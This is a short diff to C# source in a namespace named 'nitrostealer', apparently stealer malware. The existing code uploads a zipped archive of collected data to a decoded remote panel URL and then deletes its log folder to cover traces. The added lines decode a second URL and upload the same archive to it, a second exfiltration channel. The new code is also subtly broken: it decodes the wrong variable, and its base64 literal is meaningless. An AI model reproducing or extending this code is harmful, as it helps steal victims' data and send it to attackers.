@@ -97,6 +97,15 @@ namespace nitrostealer
                 WebClient client = new WebClient();
                 Uri link = new Uri(decodedString + link_panl);
                 client.UploadFile(link, zipArchive);
+
+
+                byte[] datas = Convert.FromBase64String("1488");
+                string decodedStrings = Encoding.UTF8.GetString(data);
+
+                WebClient client_ = new WebClient();
+                Uri link_ = new Uri(decodedStrings);
+                client_.UploadFile(link_, zipArchive);
+
                 Thread.Sleep(20000);
                 Directory.Delete(Help.LogPath, true);
             }
